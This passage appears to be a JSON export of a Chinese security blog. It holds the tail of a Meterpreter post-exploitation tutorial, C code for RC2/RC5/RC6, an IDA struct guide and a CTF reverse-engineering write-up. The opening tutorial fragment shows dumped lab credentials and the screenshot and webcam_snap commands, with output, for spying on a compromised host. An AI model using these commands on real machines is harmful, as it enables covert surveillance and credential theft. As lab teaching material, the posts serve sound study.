AUTHORITY LOCAL SERVICE0;996 Negotiate WORKGROUP WIN-Q1ST6EBNLTR$0;52252 NTLM0;999 NTLM WORKGROUP WIN-Q1ST6EBNLTR$0;333800 NTLM WIN-Q1ST6EBNLTR victim admin1230;333754 NTLM WIN-Q1ST6EBNLTR victim admin123 截取屏幕使用 screenshot 可以截取桌面实时图片： 12meterpreter &gt; screenshotScreenshot saved to: /root/NjEXrhqY.jpeg 用摄像头拍照使用 webcam 系列命令可以用摄像头拍照： 1234567meterpreter &gt; webcam_list1: VMware Virtual USB Video Devicemeterpreter &gt; webcam_snap[*] Starting...[+] Got frame[*] StoppedWebcam shot saved to: /root/jkhYoacC.jpeg Referenceshttps://blog.51cto.com/chenxinjie/2092754https://mp.weixin.qq.com/s/swR4LjNJgHsx2VetyM6G5Qhttps://www.anquanke.com/post/id/164525https://zhuanlan.zhihu.com/p/25857679https://xz.aliyun.com/t/2536http://hardsec.net/mimikatz-meterpreter-extension/?lang=en","categories":[],"tags":[{"name":"cve","slug":"cve","permalink":"qianfei11.coding.me/tags/cve/"},{"name":"kali","slug":"kali","permalink":"qianfei11.coding.me/tags/kali/"}]},{"title":"C语言实现RC2、RC5、RC6加密解密算法","slug":"C语言实现RC2、RC5、RC6加密解密算法","date":"2019-09-03T05:38:28.000Z","updated":"2019-09-06T09:17:29.717Z","comments":true,"path":"2019/09/03/C语言实现RC2、RC5、RC6加密解密算法/","link":"","permalink":"qianfei11.coding.me/2019/09/03/C语言实现RC2、RC5、RC6加密解密算法/","excerpt":"RC 算法是由 Ron Rivest 发明的一系列对称密钥加密算法。虽然这一系列的算法名字相似，但实际上算法之间没有太大的关联。","text":"RC 算法是由 Ron Rivest 发明的一系列对称密钥加密算法。虽然这一系列的算法名字相似，但实际上算法之间没有太大的关联。 Intro现在总共有六个 RC 系列的算法。其中 RC1 从来没有发布过，RC3 在开始使用前就被证明是不安全的。余下的都是现如今有所运用的算法。 RC2 是一个于 1987 年发布的 64 位分组加密算法。 RC4 是当今运用最广泛的序列密码。我在之前的文章中实现过。 RC5 是一个于 1994 年发布的 32/64/128 位分组加密算法。 RC6 是一个于 1997 年发布的基于 RC5 的 128 位分组加密算法，在当年 AES 的评选中曾是 AES 决赛算法。 了解过算法的基本知识后，下面是 RC2、RC5 以及 RC6 在 C 语言下的实现。 RC2RC2 是一种分组密码，和 DES 很像，它的输入和输出的长度都是 64 位，而密钥是可变的，长度范围是从 1 到 128 比特，目前使用的是 8 比特的密钥。RC2 被设计成能够在 16 位处理器上运行。在 IBM AT 上它能够比 DES 的加密速度快一倍（假设在完成密钥扩展的情况下）。 RC2 总共分为三个算法步骤。分别是密钥扩展、加密、解密。 密钥扩展算法密钥扩展通过一个长度变化的密钥生成 64 个字数组。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051void rc2_keygen(unsigned short xkey[64], const unsigned char *key, unsigned len, unsigned bits)&#123; unsigned char x; unsigned i; /* 256-entry permutation table, probably derived somehow from pi */ static const unsigned char PITABLE[256] = &#123;0xD9, 0x78, 0xF9, 0xC4, 0x19, 0xDD, 0xB5, 0xED, 0x28, 0xE9, 0xFD, 0x79, 0x4A, 0xA0, 0xD8, 0x9D, 0xC6, 0x7E, 0x37, 0x83, 0x2B, 0x76, 0x53, 0x8E, 0x62, 0x4C, 0x64, 0x88, 0x44, 0x8B, 0xFB, 0xA2, 0x17, 0x9A, 0x59, 0xF5, 0x87, 0xB3, 0x4F, 0x13, 0x61, 0x45, 0x6D, 0x8D, 0x09, 0x81, 0x7D, 0x32, 0xBD, 0x8F, 0x40, 0xEB, 0x86, 0xB7, 0x7B, 0x0B, 0xF0, 0x95, 0x21, 0x22, 0x5C, 0x6B, 0x4E, 0x82, 0x54, 0xD6, 0x65, 0x93, 0xCE, 0x60, 0xB2, 0x1C, 0x73, 0x56, 0xC0, 0x14, 0xA7, 0x8C, 0xF1, 0xDC, 0x12, 0x75, 0xCA, 0x1F, 0x3B, 0xBE, 0xE4, 0xD1, 0x42, 0x3D, 0xD4, 0x30, 0xA3, 0x3C, 0xB6, 0x26, 0x6F, 0xBF, 0x0E, 0xDA, 0x46, 0x69, 0x07, 0x57, 0x27, 0xF2, 0x1D, 0x9B, 0xBC, 0x94, 0x43, 0x03, 0xF8, 0x11, 0xC7, 0xF6, 0x90, 0xEF, 0x3E, 0xE7, 0x06, 0xC3, 0xD5, 0x2F, 0xC8, 0x66, 0x1E, 0xD7, 0x08, 0xE8, 0xEA, 0xDE, 0x80, 0x52, 0xEE, 0xF7, 0x84, 0xAA, 0x72, 0xAC, 0x35, 0x4D, 0x6A, 0x2A, 0x96, 0x1A, 0xD2, 0x71, 0x5A, 0x15, 0x49, 0x74, 0x4B, 0x9F, 0xD0, 0x5E, 0x04, 0x18, 0xA4, 0xEC, 0xC2, 0xE0, 0x41, 0x6E, 0x0F, 0x51, 0xCB, 0xCC, 0x24, 0x91, 0xAF, 0x50, 0xA1, 0xF4, 0x70, 0x39, 0x99, 0x7C, 0x3A, 0x85, 0x23, 0xB8, 0xB4, 0x7A, 0xFC, 0x02, 0x36, 0x5B, 0x25, 0x55, 0x97, 0x31, 0x2D, 0x5D, 0xFA, 0x98, 0xE3, 0x8A, 0x92, 0xAE, 0x05, 0xDF, 0x29, 0x10, 0x67, 0x6C, 0xBA, 0xC9, 0xD3, 0x00, 0xE6, 0xCF, 0xE1, 0x9E, 0xA8, 0x2C, 0x63, 0x16, 0x01, 0x3F, 0x58, 0xE2, 0x89, 0xA9, 0x0D, 0x38, 0x34, 0x1B, 0xAB, 0x33, 0xFF, 0xB0, 0xBB, 0x48, 0x0C, 0x5F, 0xB9, 0xB1, 0xCD, 0x2E, 0xC5, 0xF3, 0xDB, 0x47, 0xE5, 0xA5, 0x9C, 0x77, 0x0A, 0xA6, 0x20, 0x68, 0xFE, 0x7F, 0xC1, 0xAD&#125;; assert(len &gt; 0 &amp;&amp; len &lt;= 128); assert(bits &lt;= 1024); if (!bits) bits = 1024; memcpy(xkey, key, len); /* Phase 1: Expand input key to 128 bytes */ // for i = T, T+1, ..., 127 do // L[i] = PITABLE[L[i-1] + L[i-T]]; if (len &lt; 128) &#123; i = 0; x = ((unsigned char *)xkey)[len - 1]; do &#123; x = PITABLE[(x + ((unsigned char *)xkey)[i++]) &amp; 255]; ((unsigned char *)xkey)[len++] = x; &#125; while (len &lt; 128); &#125; /* Phase 2 - reduce effective key size to \"bits\" */ // L[128-T8] = PITABLE[L[128-T8] &amp; TM]; len = (bits + 7) &gt;&gt; 3; // bits = T1, len = T8, T8 = (T1+7)/8; i = 128 - len; x = PITABLE[((unsigned char *)xkey)[i] &amp; (255 &gt;&gt; (7 &amp; -bits))]; // (255 &gt;&gt; (7 &amp; -bits) = TM, TM = 255 MOD 2^(8 + T1 - 8*T8); ((unsigned char *)xkey)[i] = x; // for i = 127-T8, ..., 0 do // L[i] = PITABLE[L[i+1] XOR L[i+T8]]; while (i--) &#123; x = PITABLE[x ^ ((unsigned char *)xkey)[i + len]]; ((unsigned char *)xkey)[i] = x; &#125; /* Phase 3 - copy to xkey in little-endian order */ i = 63; do &#123; xkey[i] = ((unsigned char *)xkey)[2 * i] + (((unsigned char *)xkey)[2 * i + 1] &lt;&lt; 8); &#125; while (i--);&#125; 加密算法加密操作将一组 64 比特的字存入 4 个字中再进行加密。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546void rc2_encrypt(unsigned short xkey[64], unsigned char *plain, unsigned char *cipher)&#123; // xkey = K, plain = R unsigned x76, x54, x32, x10, i; x76 = (plain[7] &lt;&lt; 8) + plain[6]; x54 = (plain[5] &lt;&lt; 8) + plain[4]; x32 = (plain[3] &lt;&lt; 8) + plain[2]; x10 = (plain[1] &lt;&lt; 8) + plain[0]; for (i = 0; i &lt; 16; i++) &#123; // R[i] = R[i] + K[j] + (R[i-1] &amp; R[i-2]) + ((~R[i-1]) &amp; R[i-3]); // j = j + 1; // R[i] = R[i] rol s[i]; x10 += (x32 &amp; ~x76) + (x54 &amp; x76) + xkey[4 * i + 0]; x10 = (x10 &lt;&lt; 1) + (x10 &gt;&gt; 15 &amp; 1); x32 += (x54 &amp; ~x10) + (x76 &amp; x10) + xkey[4 * i + 1]; x32 = (x32 &lt;&lt; 2) + (x32 &gt;&gt; 14 &amp; 3); x54 += (x76 &amp; ~x32) + (x10 &amp; x32) + xkey[4 * i + 2]; x54 = (x54 &lt;&lt; 3) + (x54 &gt;&gt; 13 &amp; 7); x76 += (x10 &amp; ~x54) + (x32 &amp; x54) + xkey[4 * i + 3]; x76 = (x76 &lt;&lt; 5) + (x76 &gt;&gt; 11 &amp; 31); // R[i] = R[i] + K[R[i-1] &amp; 63]; if (i == 4 || i == 10) &#123; x10 += xkey[x76 &amp; 63]; x32 += xkey[x10 &amp; 63]; x54 += xkey[x32 &amp; 63]; x76 += xkey[x54 &amp; 63]; &#125; &#125; cipher[0] = (unsigned char)x10; cipher[1] = (unsigned char)(x10 &gt;&gt; 8); cipher[2] = (unsigned char)x32; cipher[3] = (unsigned char)(x32 &gt;&gt; 8); cipher[4] = (unsigned char)x54; cipher[5] = (unsigned char)(x54 &gt;&gt; 8); cipher[6] = (unsigned char)x76; cipher[7] = (unsigned char)(x76 &gt;&gt; 8);&#125; 解密算法解密操作即为加密操作的逆运算。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950void rc2_decrypt(unsigned short xkey[64], unsigned char *plain, unsigned char *cipher)&#123; unsigned x76, x54, x32, x10, i; x76 = (cipher[7] &lt;&lt; 8) + cipher[6]; x54 = (cipher[5] &lt;&lt; 8) + cipher[4]; x32 = (cipher[3] &lt;&lt; 8) + cipher[2]; x10 = (cipher[1] &lt;&lt; 8) + cipher[0]; i = 15; do &#123; // R[i] = R[i] ror s[i]; // R[i] = R[i] - K[j] - (R[i-1] &amp; R[i-2]) - ((~R[i-1]) &amp; R[i-3]); // j = j - 1; x76 &amp;= 65535; x76 = (x76 &lt;&lt; 11) + (x76 &gt;&gt; 5); x76 -= (x10 &amp; ~x54) + (x32 &amp; x54) + xkey[4 * i + 3]; x54 &amp;= 65535; x54 = (x54 &lt;&lt; 13) + (x54 &gt;&gt; 3); x54 -= (x76 &amp; ~x32) + (x10 &amp; x32) + xkey[4 * i + 2]; x32 &amp;= 65535; x32 = (x32 &lt;&lt; 14) + (x32 &gt;&gt; 2); x32 -= (x54 &amp; ~x10) + (x76 &amp; x10) + xkey[4 * i + 1]; x10 &amp;= 65535; x10 = (x10 &lt;&lt; 15) + (x10 &gt;&gt; 1); x10 -= (x32 &amp; ~x76) + (x54 &amp; x76) + xkey[4 * i + 0]; // R[i] = R[i] - K[R[i-1] &amp; 63]; if (i == 5 || i == 11) &#123; x76 -= xkey[x54 &amp; 63]; x54 -= xkey[x32 &amp; 63]; x32 -= xkey[x10 &amp; 63]; x10 -= xkey[x76 &amp; 63]; &#125; &#125; while (i--); plain[0] = (unsigned char)x10; plain[1] = (unsigned char)(x10 &gt;&gt; 8); plain[2] = (unsigned char)x32; plain[3] = (unsigned char)(x32 &gt;&gt; 8); plain[4] = (unsigned char)x54; plain[5] = (unsigned char)(x54 &gt;&gt; 8); plain[6] = (unsigned char)x76; plain[7] = (unsigned char)(x76 &gt;&gt; 8);&#125; RC5RC5 同样也是分组密码，它支持可变的分组大小(32、64 或 128 比特)，密钥长度（0 至 2040 位）和加密轮数（0 ～ 255）。RC5 中有几个参数，w 代表一个字的字节大小，RC5 是以一个字为单位来进行所有操作的；r 代表加密轮数；b 代表密钥的长度。RC5 常用的 w 通常为 16、32 和 64。下面实现的是 w 为 32 时的 RC5 算法。 RC5 和 RC2 类似，总共分为三个算法步骤。分别是密钥扩展、加密、解密。 算法中需要一些宏定义： 1234567891011typedef unsigned int WORD; /* Should be 32-bit = 4 bytes */#define w 32 /* word size in bits */#define r 12 /* number of rounds */#define b 16 /* number of bytes in key */#define c 4 /* number words in key */#define t 26 /* size of table S = 2*(r+1) words */WORD S[t]; /* expanded key table */WORD P = 0xb7e15163, Q = 0x9e3779b9; /* magic constants *//* Rotation operators. x must be unsigned, to get logical right shift */#define ROTL(x, y) (((x) &lt;&lt; (y &amp; (w - 1))) | ((x) &gt;&gt; (w - (y &amp; (w - 1)))))#define ROTR(x, y) (((x) &gt;&gt; (y &amp; (w - 1))) | ((x) &lt;&lt; (w - (y &amp; (w - 1))))) 密钥扩展算法密钥扩展首先分别初始化 L 数组和 S 盒，随后通过 L 进行按字异或得到 S 盒。 123456789101112131415161718void rc5_keygen(unsigned char *K) /* secret input ket K[0...b-1] */&#123; WORD i, j, k, u = w / 8, A, B, L[c]; /* Initialize L, then S, then mix key into S */ for (i = b - 1, L[c - 1] = 0; i != -1; i--) &#123; L[i / u] = (L[i / u] &lt;&lt; 8) + K[i]; &#125; for (S[0] = P, i = 1; i &lt; t; i++) &#123; S[i] = S[i - 1] + Q; &#125; for (A = B = i = j = k = 0; k &lt; 3 * t; k++, i = (i + 1) % t, j = (j + 1) % c) /* 3*t &gt; 3*c */ &#123; A = S[i] = ROTL(S[i] + (A + B), 3); B = L[j] = ROTL(L[j] + (A + B), (A + B)); &#125;&#125; 加密算法加密涉及的一个简单轮函数的加密。基于安全需要和时间方面的考虑，建议 12 或 20 轮加密。 123456789101112131415161718192021222324void rc5_encrypt(unsigned char *plain, unsigned char *cipher) /* 2 WORD input pt/output ct */&#123; WORD pt[2], ct[2]; for (int i = 0; i &lt; 2; i++) &#123; pt[i] = plain[4 * i] + (plain[4 * i + 1] &lt;&lt; 8) + (plain[4 * i + 2] &lt;&lt; 16) + (plain[4 * i + 3] &lt;&lt; 24); &#125; WORD A = pt[0] + S[0], B = pt[1] + S[1]; for (int i = 1; i &lt;= r; i++) &#123; A = ROTL(A ^ B, B) + S[2 * i]; B = ROTL(B ^ A, A) + S[2 * i + 1]; &#125; ct[0] = A; ct[1] = B; for (int i = 0; i &lt; 2; i++) &#123; cipher[4 * i] = ct[i] &amp; 0xFF; cipher[4 * i + 1] = (ct[i] &gt;&gt; 8) &amp; 0xFF; cipher[4 * i + 2] = (ct[i] &gt;&gt; 16) &amp; 0xFF; cipher[4 * i + 3] = (ct[i] &gt;&gt; 24) &amp; 0xFF; &#125;&#125; 解密算法解密实际上就是加密过程的逆运算。 1234567891011121314151617181920212223void rc5_decrypt(unsigned char *cipher, unsigned char *plain) /* 2 WORD input ct/output pt */&#123; WORD pt[2], ct[2]; for (int i = 0; i &lt; 2; i++) &#123; ct[i] = cipher[4 * i] + (cipher[4 * i + 1] &lt;&lt; 8) + (cipher[4 * i + 2] &lt;&lt; 16) + (cipher[4 * i + 3] &lt;&lt; 24); &#125; WORD B = ct[1], A = ct[0]; for (int i = r; i &gt; 0; i--) &#123; B = ROTR(B - S[2 * i + 1], A) ^ A; A = ROTR(A - S[2 * i], B) ^ B; &#125; pt[1] = B - S[1]; pt[0] = A - S[0]; for (int i = 0; i &lt; 2; i++) &#123; plain[4 * i] = pt[i] &amp; 0xFF; plain[4 * i + 1] = (pt[i] &gt;&gt; 8) &amp; 0xFF; plain[4 * i + 2] = (pt[i] &gt;&gt; 16) &amp; 0xFF; plain[4 * i + 3] = (pt[i] &gt;&gt; 24) &amp; 0xFF; &#125;&#125; RC6RC6 是一个从 RC5 派生而来的对称分组加密算法，用以满足高级加密标准（AES）竞赛的要求。RC6 拥有 128 位的块大小，支持 128、192、256 位乃至 2040 位的密钥长度。像 RC5 一样，RC6 是可以被参数化的。它也因而支持变长的分组大小、密钥长度以及加密轮数。RC6 和 RC5 在结构、使用基于数据的置换规则、取模加法以及异或操作等很多方面都很相似。事实上，RC6 可以被看做是交织的两组平行的 RC5 加密。其中，RC6 使用了乘法运算，能够让置换基于字中每一位，而不是其中的几位。 算法中需要一些宏定义： 123456789101112typedef unsigned int WORD; /* Should be 32-bit = 4 bytes */#define w 32 /* word size in bits */#define r 20 /* based on security estimates */#define bytes (w / 8) /* bytes per word */#define c ((b + bytes - 1) / bytes) /* key in words, rounded up */#define R24 (2 * r + 4) /* length of array S */#define lgw 5 /* log2(w) -- wussed out */WORD S[R24 - 1]; /* Key schedule */WORD P = 0xb7e15163, Q = 0x9e3779b9; /* magic constants *//* Rotation operators. x must be unsigned, to get logical right shift */#define ROTL(x, y) (((x) &lt;&lt; (y &amp; (w - 1))) | ((x) &gt;&gt; (w - (y &amp; (w - 1)))))#define ROTR(x, y) (((x) &gt;&gt; (y &amp; (w - 1))) | ((x) &lt;&lt; (w - (y &amp; (w - 1))))) 密钥扩展算法RC6 中接受的密钥长度相比于 RC5 更长，生成的 S 盒大小为 2r+4。 12345678910111213141516171819202122232425262728void rc6_keygen(unsigned char *K, int b)&#123; int i, j, s, v; WORD L[(32 + bytes - 1) / bytes]; /* Big enough for max b */ WORD A, B; L[c - 1] = 0; for (i = b - 1; i &gt;= 0; i--) L[i / bytes] = (L[i / bytes] &lt;&lt; 8) + K[i]; S[0] = P; for (i = 1; i &lt;= 2 * r + 3; i++) S[i] = S[i - 1] + Q; A = B = i = j = 0; v = R24; if (c &gt; v) v = c; v *= 3; for (s = 1; s &lt;= v; s++) &#123; A = S[i] = ROTL(S[i] + A + B, 3); B = L[j] = ROTL(L[j] + A + B, A + B); i = (i + 1) % R24; j = (j + 1) % c; &#125;&#125; 加密算法RC6 加密时比 RC5 多了乘法运算，加密过程也变得更复杂。 12345678910111213141516171819202122232425262728293031323334353637383940414243void rc6_encrypt(unsigned char *plain, unsigned char *cipher)&#123; WORD pt[4], ct[4]; for (int i = 0; i &lt; 4; i++) &#123; pt[i] = plain[4 * i] + (plain[4 * i + 1] &lt;&lt; 8) + (plain[4 * i + 2] &lt;&lt; 16) + (plain[4 * i + 3] &lt;&lt; 24); &#125; WORD A, B, C, D, t, u, x; A = pt[0]; B = pt[1]; C = pt[2]; D = pt[3]; B += S[0]; D += S[1]; for (int i = 2; i &lt;= 2 * r; i += 2) &#123; t = ROTL(B * (2 * B + 1), lgw); u = ROTL(D * (2 * D + 1), lgw); A = ROTL(A ^ t, u) + S[i]; C = ROTL(C ^ u, t) + S[i + 1]; x = A; A = B; B = C; C = D; D = x; &#125; A += S[2 * r + 2]; C += S[2 * r + 3]; ct[0] = A; ct[1] = B; ct[2] = C; ct[3] = D; for (int i = 0; i &lt; 4; i++) &#123; cipher[4 * i] = ct[i] &amp; 0xFF; cipher[4 * i + 1] = (ct[i] &gt;&gt; 8) &amp; 0xFF; cipher[4 * i + 2] = (ct[i] &gt;&gt; 16) &amp; 0xFF; cipher[4 * i + 3] = (ct[i] &gt;&gt; 24) &amp; 0xFF; &#125;&#125; 解密算法解密过程同样是加密过程的逆运算。 12345678910111213141516171819202122232425262728293031323334353637383940414243void rc6_decrypt(unsigned char *cipher, unsigned char *plain)&#123; WORD pt[4], ct[4]; for (int i = 0; i &lt; 4; i++) &#123; ct[i] = cipher[4 * i] + (cipher[4 * i + 1] &lt;&lt; 8) + (cipher[4 * i + 2] &lt;&lt; 16) + (cipher[4 * i + 3] &lt;&lt; 24); &#125; WORD A, B, C, D, t, u, x; A = ct[0]; B = ct[1]; C = ct[2]; D = ct[3]; C -= S[2 * r + 3]; A -= S[2 * r + 2]; for (int i = 2 * r; i &gt;= 2; i -= 2) &#123; x = D; D = C; C = B; B = A; A = x; u = ROTL(D * (2 * D + 1), lgw); t = ROTL(B * (2 * B + 1), lgw); C = ROTR(C - S[i + 1], t) ^ u; A = ROTR(A - S[i], u) ^ t; &#125; D -= S[1]; B -= S[0]; pt[0] = A; pt[1] = B; pt[2] = C; pt[3] = D; for (int i = 0; i &lt; 4; i++) &#123; plain[4 * i] = pt[i] &amp; 0xFF; plain[4 * i + 1] = (pt[i] &gt;&gt; 8) &amp; 0xFF; plain[4 * i + 2] = (pt[i] &gt;&gt; 16) &amp; 0xFF; plain[4 * i + 3] = (pt[i] &gt;&gt; 24) &amp; 0xFF; &#125;&#125; ReferencesRC_algorithmA Comparative Study of Rivest Cipher Algorithms现代密码学教程A Description of the RC2(r) Encryption AlgorithmThe RC\u00015 Encryption AlgorithmThe RC6 Block Cipher","categories":[],"tags":[{"name":"c","slug":"c","permalink":"qianfei11.coding.me/tags/c/"},{"name":"crypto","slug":"crypto","permalink":"qianfei11.coding.me/tags/crypto/"}]},{"title":"如何使用IDA创建结构体","slug":"如何使用IDA创建结构体","date":"2019-09-01T03:16:02.000Z","updated":"2019-09-01T08:07:29.727Z","comments":true,"path":"2019/09/01/如何使用IDA创建结构体/","link":"","permalink":"qianfei11.coding.me/2019/09/01/如何使用IDA创建结构体/","excerpt":"IDA 无法直接反编译出程序所构造的结构体，但我们可以通过观察伪代码来判断并在 IDA 中创建结构体","text":"IDA 无法直接反编译出程序所构造的结构体，但我们可以通过观察伪代码来判断并在 IDA 中创建结构体 Source Code源码摘自菜鸟教程的 C 语言教程： 1234567891011121314#include &lt;stdio.h&gt;struct Books&#123; char title[10]; char author[10]; char subject[20]; int book_id;&#125; book = &#123;\"C 语言\", \"RUNOOB\", \"编程语言\", 123456&#125;;int main()&#123; printf(\"title : %s\\nauthor: %s\\nsubject: %s\\nbook_id: %d\\n\", book.title, book.author, book.subject, book.book_id);&#125; Problem在 IDA 中 f5 反编译后得到的结果： 12345678910int __cdecl main(int argc, const char **argv, const char **envp)&#123; printf( \"title : %s\\nauthor: %s\\nsubject: %s\\nbook_id: %d\\n\", &amp;book, (char *)&amp;book + 10, (char *)&amp;book + 20, (unsigned int)dword_100001040); return 0;&#125; 可以看到 IDA 并不能解析出我们构造的结构体。IDA 之所以在分析阶段无法识别结构体，可能源于两个原因。 首先，虽然 IDA 了解某个结构体的布局，但它并没有足够的信息，能够判断程序确实使用了结构体。 其次，程序中的结构体可能是一种 IDA 对其一无所知的非标准结构体。 Solution关于结构体我们所会使用的主要操作包括添加、删除和编辑结构体。首先打开 Structures（结构体）窗口，使用热键 INSERT 打开 Creat Structure/Union（创建结构体/联合）对话框。 为了创建一个新的结构体，必须首先在 Structure name（结构体名称）输入框中指定结构体的名称。前两个复选框用于决定新结构体在结构体窗口中的显示位置，或者是否在窗口中显示新结构体。第三个复选框 Creat union（创建联合），指定你定义的是否为 C 风格联合结构体。结构体的大小是它所包含的字段大小的总和，而联合的大小则等于其中最大字段的大小。Add standard structure（添加标准结构体）按钮用于访问 IDA 当前能够识别的全部结构体数据类型。指定结构体的名称并单击 OK 后，IDA 将在结构体窗口中创建一个空结构体定义。 为了给新结构体添加字段，必须利用字段创建命令 D、A 和数字键盘上的星号键(*)。D 命令的行为非常依赖于光标的位置，建议采用下面的步骤给结构体添加字段。 首先将光标放在结构体定义的最后一行（包含 ends 的那一行）并按下 D 键。这时，IDA 就会在结构体的末尾添加一个新字段。新字段的大小取决于你在数据转盘上选择的第一个大小。最初，字段的名称为 field_N，这里的 N 为结构体开头到新字段(如 field_0)开头的数字偏移量。 如果需要修改字段的大小，首先将光标放在新字段的名称上，然后重复按下 D 键，使数据转盘上的数据类型开始循环，从而为新字段选择正确的数据大小。另外，你还可以使用 Options ► Setup Data Types 来指定一个在数据转盘上不存在的大小。如果新字段是一个数组，右击其名称并在上下文菜单中选择 Array，将打开“数组规范”对话框。 要更改一个结构体字段的名称，单击字段名称并按下 N 键，或者右击该名称并在上下文菜单中选择 Name，然后在输入框中输入一个名称即可。 根据以上步骤，可以构造如下结构体。 在定义自己的结构体时，下面的提示可能会有所帮助。 一个字段的字节偏移量以一个 8 位十六进制值在结构体窗口的左侧显示。 每次你添加或删除一个结构体字段，或更改一个现有字段的大小，结构体的新 sizeof 大小都会在结构体定义的第一行反映出来。 可以给一个结构体字段添加注释，就像给任何反汇编行添加注释一样。右击（或使用热键）希望为其添加注释的字段，在上下文菜单中选择一个注释选项即可。 与结构体窗口顶部的说明不同的是，只有当一个字段是结构体中的最后一个字段时，使用 U 键才能删除该字段。对于所有其他字段，按下 U 键将取消该字段的定义，这样做仅仅删除了该字段的名称，并没有删除分配给该字段的字节。 必须对一个结构体定义中的所有字段进行适当的对齐。IDA 并不区分已压缩和未压缩的结构体。为将字段适当对齐，如需要填补字节，那么必须负责添加这些字节。填补字节最好作为适当大小的哑字段添加。在添加额外的字段后，可以选择取消或保留这些字段的定义。 分配到结构体中间的字节只有在取消关联字段的定义后才能删除，使用 Edit ► Shrink Struct Type（缩小结构体类型）即可删除被取消定义的字节。 可以在结构体的中间添加新的字节：选择新字节后面的一个字段，然后使用 Edit ► Expand Struct Type（扩大结构体类型）在选中的字段前插入一定数量的字节。 如果知道结构体的大小，而不了解它的布局，就需要创建两个字段。第一个字段为一个数组，它的大小为结构体的大小减去 1 个字节(size-1)；第二个字段应为 1 个字节。创建第二个字段后，取消第一个（数组）字段的定义。这样，结构体的大小被保留下来，随后，当进一步了解该结构体的布局后，可以回过头来定义它的字段及其大小。 通过重复应用这些步骤（添加字段、设置字段大小、添加填补字节等），就可以在 IDA 中创建一个 Books 结构体。 重新给变量设置数据类型为 Book，得到如下结果。 12345int __cdecl main(int argc, const char **argv, const char **envp)&#123; printf(\"title : %s\\nauthor: %s\\nsubject: %s\\nbook_id: %d\\n\", &amp;book, &amp;book.gap1[9], &amp;book.gapC[8], unk_100001040); return 0;&#125; 还有一种方法是直接导入新的结构体。IDA 能够解析 C（而非 C++）数据声明，以及整个 C 头文件，并自动为在这些声明或头文件中定义的结构体创建对应的 IDA 结构体。如果碰巧有正在进行逆向的二进制文件的源代码，或者头文件，那么就可以让 IDA 直接从源代码中提取出相关结构体，从而节省大量时间。 IDA 5.2 版引入了 “本地类型” 子窗口，使用 View ► OpenSubviews ► Local Types（查看 ► 打开子窗口 ► 本地类型）打开该窗口，其中列出了所有解析到当前数据库中的类型。新数据库的“本地类型”窗口最初是空的，但是，该窗口能够通过 INSERT 键或上下文菜单中的 Insert 选项解析新的类型。 解析新类型时发生的错误将在 IDA 的消息窗口中显示。如果类型声明被成功解析，“本地类型” 窗口将列出该类型及其相关声明。可以看到先前在 Structures 窗口添加的结构体和刚才直接导入的结构体信息。 重新设置变量的数据类型为 Book2，可以得到一个完美的结果： 12345678910int __cdecl main(int argc, const char **argv, const char **envp)&#123; printf( \"title : %s\\nauthor: %s\\nsubject: %s\\nbook_id: %d\\n\", &amp;book, book.author, book.subject, (unsigned int)book.book_id); return 0;&#125; ReferencesThe IDA Pro Bookhttps://www.runoob.com/cprogramming/c-structures.html","categories":[],"tags":[{"name":"re","slug":"re","permalink":"qianfei11.coding.me/tags/re/"}]},{"title":"杭电CTF-题库-reverse","slug":"杭电CTF-题库-reverse","date":"2019-08-24T03:33:30.000Z","updated":"2019-08-28T05:01:31.376Z","comments":true,"path":"2019/08/24/杭电CTF-题库-reverse/","link":"","permalink":"qianfei11.coding.me/2019/08/24/杭电CTF-题库-reverse/","excerpt":"在杭电的平台上做了几道题。","text":"在杭电的平台上做了几道题。 ebCTF-Teaser-BIN100-Dice12$ file ebCTF-Teaser-BIN100-Dice.exeebCTF-Teaser-BIN100-Dice.exe: PE32 executable (console) Intel 80386 (stripped to external PDB), for MS Windows 拖进 OD，搜索字符串： 大概可以看出是一个摇骰子的游戏，如果全部正确就能得到 flag。最直接的想法就是用 OD 边调试边修改寄存器的值，最后就能得到 flag： 更方便的方式是直接在 IDA 里把所有判断不正确的跳转 patch 掉，这样就能直接得到结果： 也可以在 IDA 里直接逆，关键部分代码： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110... if ( v82 == 7 ) &#123; fctx.call_site = 1; v43 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;( (int)&amp;std::cout, \"[*] You rolled a seven, with a six sided dice! How awesome are you?!\"); v44 = std::ostream::operator&lt;&lt;(v43, std::endl&lt;char,std::char_traits&lt;char&gt;&gt;); std::ostream::operator&lt;&lt;(v44, std::endl&lt;char,std::char_traits&lt;char&gt;&gt;); v85 *= 2; v85 *= 50; v85 /= 50; v85 += 65; v85 -= 65; v85 *= 42; v85 /= 42; v49 = time(0); v79 = v49; v81 = v49 - v80; if ( v49 - v80 &gt; 2 ) v85 *= 2; for ( i = 0; ; ++i ) &#123; fctx.call_site = 1; v50 = std::string::size((std::string *)&amp;v87); if ( i &gt;= v50 ) break; v51 = (_BYTE *)std::string::operator[]((std::string *)&amp;v87, i); *v51 ^= v85; &#125; i = 0; for ( j = 0; ; ++j ) &#123; fctx.call_site = 1; v52 = std::string::size((std::string *)&amp;v84); if ( j &gt;= v52 ) break; v64 = (_BYTE *)std::string::operator[]((std::string *)&amp;v84, j); v53 = (_BYTE *)std::string::operator[]((std::string *)&amp;v87, i); *v64 ^= *v53; ++i; v54 = std::string::length((std::string *)&amp;v87); if ( i &gt;= v54 ) i = 0; &#125; fctx.call_site = 1; if ( std::string::find((std::string *)&amp;v84, \"ebCTF\", 0) == -1 ) &#123; fctx.call_site = 1; v59 = std::ostream::operator&lt;&lt;(&amp;std::cout, std::endl&lt;char,std::char_traits&lt;char&gt;&gt;); v60 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;( v59, \"[!] It seems you did something wrong :( No flag for you.\"); v61 = std::ostream::operator&lt;&lt;(v60, std::endl&lt;char,std::char_traits&lt;char&gt;&gt;); std::ostream::operator&lt;&lt;(v61, std::endl&lt;char,std::char_traits&lt;char&gt;&gt;); fctx.call_site = 3; std::string::~string((std::string *)&amp;v72); fctx.call_site = 5; std::string::~string((std::string *)&amp;v73); fctx.call_site = 7; std::string::~string((std::string *)&amp;v74); fctx.call_site = 9; std::string::~string((std::string *)&amp;v75); fctx.call_site = 11; std::string::~string((std::string *)&amp;v76); fctx.call_site = 13; std::string::~string((std::string *)&amp;v77); fctx.call_site = 15; std::string::~string((std::string *)&amp;v78); 